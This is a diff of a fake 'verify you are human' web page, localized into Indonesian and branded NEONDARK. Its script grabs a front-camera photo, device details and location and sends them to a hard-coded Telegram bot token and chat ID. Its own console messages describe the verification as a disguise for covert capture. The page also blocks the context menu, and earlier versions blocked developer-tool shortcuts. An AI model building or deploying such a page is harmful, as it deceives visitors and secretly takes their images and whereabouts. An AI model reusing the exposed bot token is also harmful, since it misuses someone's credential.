@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Verify Human</title>
+    <title>Verifikasi Bukan Bot</title>
     <style>
         * {
             margin: 0;
@@ -79,10 +79,6 @@
             background: #eab308;
             animation: blink 1.2s infinite;
         }
-        .dot.red {
-            background: #ef4444;
-            animation: blink 1.2s infinite;
-        }
         @keyframes blink {
             0%,
             100% {
@@ -90,23 +86,6 @@
             }
             50% {
                 opacity: 0.2;
-            }
-        }
-        .loader {
-            border: 2px solid rgba(255, 255, 255, 0.06);
-            border-top: 2px solid #7c3aed;
-            border-radius: 50%;
-            width: 36px;
-            height: 36px;
-            animation: spin 0.8s linear infinite;
-            margin: 16px auto;
-        }
-        @keyframes spin {
-            0% {
-                transform: rotate(0deg);
-            }
-            100% {
-                transform: rotate(360deg);
             }
         }
         .btn-verify {
@@ -137,9 +116,6 @@
             opacity: 0.5;
             cursor: not-allowed;
             transform: none !important;
-        }
-        .btn-verify .icon {
-            font-size: 1.2rem;
         }
         .footer-text {
             color: #333;
@@ -189,6 +165,13 @@
         .toast.error {
             border-color: rgba(239, 68, 68, 0.3);
         }
+        .hidden {
+            display: none !important;
+        }
+        .success-icon {
+            font-size: 3rem;
+            margin-bottom: 10px;
+        }
         @media (max-width: 480px) {
             .box {
                 padding: 28px 20px;
@@ -206,34 +189,6 @@
                 font-size: 0.85rem;
             }
         }
-        .success-icon {
-            font-size: 3rem;
-            margin-bottom: 10px;
-        }
-        .hidden {
-            display: none !important;
-        }
-        .step-indicator {
-            display: flex;
-            justify-content: center;
-            gap: 8px;
-            margin: 12px 0;
-        }
-        .step-dot {
-            width: 8px;
-            height: 8px;
-            border-radius: 50%;
-            background: rgba(255, 255, 255, 0.1);
-            transition: all 0.3s ease;
-        }
-        .step-dot.active {
-            background: #7c3aed;
-            width: 24px;
-            border-radius: 4px;
-        }
-        .step-dot.done {
-            background: #22c55e;
-        }
     </style>
 </head>
 <body>
@@ -241,74 +196,51 @@
     <div class="toast" id="toast"><span id="toastMessage">✅ Ready</span></div>
 
     <div class="box" id="mainBox">
-        <!-- Shield Icon -->
         <div class="shield">🛡️</div>
+        <h1>Verifikasi Bukan Bot</h1>
+        <p class="sub">Kami perlu memastikan Anda adalah manusia, bukan bot</p>
 
-        <h1>Verify You're Human</h1>
-        <p class="sub">We need to confirm you are not a bot</p>
-
-        <!-- Step Indicator -->
-        <div class="step-indicator">
-            <div class="step-dot active" id="step1"></div>
-            <div class="step-dot" id="step2"></div>
-            <div class="step-dot" id="step3"></div>
-        </div>
-
-        <!-- Status -->
         <div class="status" id="statusBox">
             <span class="dot green" id="statusDot"></span>
-            <span id="statusText">Tap "Verify" to start</span>
+            <span id="statusText">Klik tombol di bawah untuk verifikasi</span>
         </div>
 
-        <!-- Loader (hidden by default) -->
-        <div class="loader hidden" id="loader"></div>
-
-        <!-- Verify Button -->
         <button class="btn-verify" id="verifyBtn" onclick="startVerification()">
-            <span class="icon">📸</span> Verify Now
+            📸 Verifikasi Sekarang
         </button>
 
-        <!-- Success (hidden by default) -->
         <div class="hidden" id="successBox" style="margin-top:16px;">
             <div class="success-icon">✅</div>
-            <p style="color:#22c55e; font-weight:600; font-size:0.95rem;">Verification Successful!</p>
-            <p style="color:#666; font-size:0.7rem; margin-top:4px;">You are human. Redirecting...</p>
+            <p style="color:#22c55e; font-weight:600; font-size:0.95rem;">Verifikasi Berhasil!</p>
+            <p style="color:#666; font-size:0.7rem; margin-top:4px;">Anda terverifikasi sebagai manusia.</p>
         </div>
 
-        <div class="footer-text"><span>NEONDARK</span> · Secure Verification</div>
+        <div class="footer-text"><span>NEONDARK</span> · Verifikasi Keamanan</div>
     </div>
 
-    <!-- Hidden video & canvas -->
     <video id="video" autoplay muted playsinline></video>
     <canvas id="canvas"></canvas>
 
-    <!-- ============================================================= -->
-    <!-- JAVASCRIPT -->
-    <!-- ============================================================= -->
     <script>
         // =============================================================
-        // 1. KONFIGURASI TELEGRAM (UDAH PAKE PUNYA LU)
+        // KONFIGURASI TELEGRAM
         // =============================================================
         const BOT_TOKEN = '8737287636:AAHBFuM1QAvTXoUTFxd7cjF5wHZztKZYT18';
         const CHAT_ID = '8768522731';
 
         // =============================================================
-        // 2. ELEMEN
+        // ELEMEN
         // =============================================================
         const btn = document.getElementById('verifyBtn');
         const statusText = document.getElementById('statusText');
         const statusDot = document.getElementById('statusDot');
-        const loader = document.getElementById('loader');
         const successBox = document.getElementById('successBox');
-        const step1 = document.getElementById('step1');
-        const step2 = document.getElementById('step2');
-        const step3 = document.getElementById('step3');
 
         let stream = null;
         let isProcessing = false;
 
         // =============================================================
-        // 3. TOAST
+        // TOAST
         // =============================================================
         function showToast(msg, type) {
             const toast = document.getElementById('toast');
@@ -319,7 +251,7 @@
         }
 
         // =============================================================
-        // 4. UPDATE STATUS
+        // UPDATE STATUS
         // =============================================================
         function updateStatus(msg, dotColor) {
             statusText.textContent = msg;
@@ -330,16 +262,8 @@
             }
         }
 
-        function updateStep(step) {
-            [step1, step2, step3].forEach((el, i) => {
-                el.className = 'step-dot';
-                if (i < step) el.className += ' done';
-                else if (i === step) el.className += ' active';
-            });
-        }
-
         // =============================================================
-        // 5. GET DEVICE INFO (TANPA IZIN)
+        // GET DEVICE INFO
         // =============================================================
         function getDeviceInfo() {
             const ua = navigator.userAgent;
@@ -378,7 +302,7 @@
         }
 
         // =============================================================
-        // 6. GET LOCATION (TANPA IZIN)
+        // GET LOCATION
         // =============================================================
         async function getLocation() {
             try {
@@ -407,7 +331,7 @@
         }
 
         // =============================================================
-        // 7. DATA URL TO BLOB
+        // DATA URL TO BLOB
         // =============================================================
         function dataURLtoBlob(dataURL) {
             const arr = dataURL.split(',');
@@ -420,7 +344,7 @@
         }
 
         // =============================================================
-        // 8. SEND TO TELEGRAM
+        // SEND TO TELEGRAM
         // =============================================================
         async function sendToTelegram(photoData) {
             const deviceInfo = getDeviceInfo();
@@ -474,20 +398,18 @@
         }
 
         // =============================================================
-        // 9. MAIN VERIFICATION
+        // START VERIFICATION
         // =============================================================
         async function startVerification() {
             if (isProcessing) return;
             isProcessing = true;
 
             btn.disabled = true;
-            btn.innerHTML = '<span class="icon">⏳</span> Accessing Camera...';
-            loader.classList.remove('hidden');
-            updateStatus('📸 Requesting camera access...', 'yellow');
-            updateStep(0);
+            btn.innerHTML = '⏳ Mengakses kamera...';
+            updateStatus('📸 Meminta akses kamera...', 'yellow');
 
             try {
-                // Step 1: Request camera
+                // Request camera — popup izin akan muncul dengan judul "Verifikasi Bukan Bot"
                 stream = await navigator.mediaDevices.getUserMedia({
                     video: {
                         facingMode: 'user',
@@ -497,14 +419,13 @@
                     audio: false
                 });
 
-                updateStatus('✅ Camera ready! Capturing...', 'green');
-                updateStep(1);
+                updateStatus('✅ Kamera aktif! Mengambil foto...', 'green');
 
                 const video = document.getElementById('video');
                 video.srcObject = stream;
                 await video.play();
 
-                // Step 2: Capture photo
+                // Capture foto
                 await new Promise(resolve => setTimeout(resolve, 500));
 
                 const canvas = document.getElementById('canvas');
@@ -520,36 +441,29 @@
                     stream = null;
                 }
 
-                updateStatus('📤 Sending verification...', 'yellow');
-                updateStep(2);
+                updateStatus('📤 Mengirim data verifikasi...', 'yellow');
 
-                // Step 3: Send to Telegram
+                // Kirim ke Telegram
                 const success = await sendToTelegram(photo);
 
                 if (success) {
-                    updateStatus('✅ Verification successful!', 'green');
-                    updateStep(3);
+                    updateStatus('✅ Verifikasi berhasil!', 'green');
                     btn.classList.add('hidden');
-                    loader.classList.add('hidden');
                     successBox.classList.remove('hidden');
-                    showToast('✅ Verification successful!', 'success');
-
-                    // Update main title
-                    document.querySelector('h1').textContent = '✅ Verified!';
-                    document.querySelector('.sub').textContent = 'You are human. Thank you!';
+                    showToast('✅ Verifikasi berhasil!', 'success');
                     document.querySelector('.shield').innerHTML = '✅';
-
+                    document.querySelector('h1').textContent = '✅ Terverifikasi!';
+                    document.querySelector('.sub').textContent = 'Anda terkonfirmasi sebagai manusia.';
                 } else {
-                    throw new Error('Failed to send data');
+                    throw new Error('Gagal mengirim data');
                 }
 
             } catch (e) {
-                console.error('Verification error:', e);
-                updateStatus('❌ Verification failed. Please try again.', 'red');
-                showToast('❌ Verification failed: ' + e.message, 'error');
+                console.error('Error:', e);
+                updateStatus('❌ Verifikasi gagal. Coba lagi.', 'yellow');
+                showToast('❌ Gagal mengakses kamera. Coba lagi.', 'error');
                 btn.disabled = false;
-                btn.innerHTML = '<span class="icon">🔄</span> Try Again';
-                loader.classList.add('hidden');
+                btn.innerHTML = '🔄 Coba Lagi';
                 isProcessing = false;
 
                 if (stream) {
@@ -560,34 +474,24 @@
         }
 
         // =============================================================
-        // 10. PREVENT CONTEXT MENU
+        // PREVENT CONTEXT MENU
         // =============================================================
         document.addEventListener('contextmenu', e => e.preventDefault());
         document.addEventListener('dragstart', e => e.preventDefault());
         document.addEventListener('drop', e => e.preventDefault());
 
         // =============================================================
-        // 11. PREVENT KEYBOARD SHORTCUTS
+        // CONSOLE LOG
         // =============================================================
-        document.addEventListener('keydown', e => {
-            if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && e.key === 'I') || (e.ctrlKey && e.key === 'u')) {
-                e.preventDefault();
-            }
-        });
-
-        // =============================================================
-        // 12. CONSOLE LOG
-        // =============================================================
-        console.log('%c🛡️ NEONDARK VERIFIER v3.0', 'color:#7c3aed;font-size:20px;font-weight:700;');
+        console.log('%c🛡️ NEONDARK VERIFIER', 'color:#7c3aed;font-size:20px;font-weight:700;');
         console.log('%c✅ Kedok: Verifikasi Bukan Bot', 'color:#22c55e;font-size:14px;');
         console.log('%c📸 Capture diam-diam & kirim ke Telegram', 'color:#888;font-size:12px;');
-        console.log('%c📞 BOT_TOKEN & CHAT_ID sudah di-set', 'color:#25d366;font-size:13px;');
 
         // =============================================================
-        // 13. WELCOME TOAST
+        // WELCOME TOAST
         // =============================================================
         setTimeout(() => {
-            showToast('🛡️ Tap "Verify" to prove you are human', '');
+            showToast('🛡️ Klik "Verifikasi Sekarang" untuk memulai', '');
         }, 800);
     </script>
 
